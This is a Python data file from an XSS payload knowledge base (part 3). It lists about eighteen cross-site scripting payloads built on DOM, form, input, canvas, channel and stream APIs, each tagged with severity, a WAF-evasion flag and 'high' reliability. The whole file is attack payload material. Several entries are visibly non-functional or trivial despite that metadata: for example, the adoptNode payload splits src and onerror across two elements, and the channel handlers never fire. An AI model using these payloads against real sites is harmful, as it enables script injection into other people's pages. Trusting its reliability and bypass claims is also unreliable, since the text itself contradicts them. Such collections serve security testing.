#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-27 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Ultra Deep XSS Payloads - Part 3
DOM APIs, Crypto, History, Forms, Input, Canvas, Channels, Streams.
"""

from ..models import PayloadEntry


BRS_KB_ULTRA_DEEP_PAYLOADS_PART3 = {
    # ============================================================
    # EXTREMELY OBSCURE DOM APIS
    # ============================================================
    "dom-adoptNode": PayloadEntry(
        payload="document.adoptNode(document.createElement('img')).src='x';document.adoptNode(document.createElement('img')).onerror=alert",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="adoptNode DOM manipulation",
        tags=["dom", "adoptNode"],
        bypasses=["dom_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "dom-importNode": PayloadEntry(
        payload="document.body.appendChild(document.importNode(new DOMParser().parseFromString('<img src=x onerror=alert(1)>','text/html').body.firstChild,true))",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="importNode with DOMParser",
        tags=["dom", "importNode"],
        bypasses=["dom_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "dom-normalize": PayloadEntry(
        payload="document.body.normalize()||alert(1)",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="normalize with side effect",
        tags=["dom", "normalize"],
        bypasses=["dom_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # CRYPTO API TRICKS
    # ============================================================
    "crypto-getRandomValues": PayloadEntry(
        payload="crypto.getRandomValues(new Uint8Array(alert(1)||1))",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Crypto API with side effect",
        tags=["crypto", "random"],
        bypasses=["crypto_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # HISTORY API TRICKS
    # ============================================================
    "history-pushState": PayloadEntry(
        payload="history.pushState(alert(1),'','')",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="History pushState with side effect",
        tags=["history", "pushState"],
        bypasses=["history_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "history-replaceState": PayloadEntry(
        payload="history.replaceState(alert(1),'','')",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="History replaceState with side effect",
        tags=["history", "replaceState"],
        bypasses=["history_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # FORM ELEMENTS TRICKS
    # ============================================================
    "form-elements-access": PayloadEntry(
        payload="<form id=x><input name=y onfocus=alert(1) autofocus></form>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Form elements collection",
        tags=["form", "elements"],
        bypasses=["form_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "form-checkValidity": PayloadEntry(
        payload='<form oninvalid="alert(1)"><input required><input type=submit>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Form validity event",
        tags=["form", "validity"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "form-requestSubmit": PayloadEntry(
        payload='<form onsubmit="alert(1);return false"><input type=submit id=x></form><script>x.form.requestSubmit()</script>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Form requestSubmit method",
        tags=["form", "requestSubmit"],
        bypasses=["form_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # INPUT TRICKS
    # ============================================================
    "input-setSelectionRange": PayloadEntry(
        payload='<input value="x" onfocus="this.setSelectionRange(0,1)||alert(1)">',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Input selection with side effect",
        tags=["input", "selection"],
        bypasses=["input_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "input-setRangeText": PayloadEntry(
        payload="<input onfocus=\"this.setRangeText(alert(1)||'x')\">",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Input setRangeText with side effect",
        tags=["input", "rangeText"],
        bypasses=["input_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "input-showPicker": PayloadEntry(
        payload='<input type="date" onfocus="this.showPicker()||alert(1)">',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Input showPicker with side effect",
        tags=["input", "picker"],
        bypasses=["input_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari"],
        reliability="high",
    ),
    # ============================================================
    # CANVAS TRICKS
    # ============================================================
    "canvas-toDataURL": PayloadEntry(
        payload="document.createElement('canvas').toDataURL(alert(1)||'image/png')",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Canvas toDataURL with side effect",
        tags=["canvas", "dataURL"],
        bypasses=["canvas_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # BROADCAST CHANNEL
    # ============================================================
    "broadcastChannel": PayloadEntry(
        payload="new BroadcastChannel('x').onmessage=e=>alert(e.data)",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="BroadcastChannel message handler",
        tags=["broadcast", "channel"],
        bypasses=["channel_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # MESSAGE CHANNEL
    # ============================================================
    "messageChannel": PayloadEntry(
        payload="new MessageChannel().port1.onmessage=e=>alert(e.data)",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="MessageChannel port handler",
        tags=["message", "channel"],
        bypasses=["channel_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # READABLE/WRITABLE STREAMS
    # ============================================================
    "readableStream": PayloadEntry(
        payload="new ReadableStream({start:c=>alert(1)})",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="ReadableStream start callback",
        tags=["stream", "readable"],
        bypasses=["stream_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "writableStream": PayloadEntry(
        payload="new WritableStream({start:()=>alert(1)})",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="WritableStream start callback",
        tags=["stream", "writable"],
        bypasses=["stream_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "transformStream": PayloadEntry(
        payload="new TransformStream({start:()=>alert(1)})",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="TransformStream start callback",
        tags=["stream", "transform"],
        bypasses=["stream_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
}
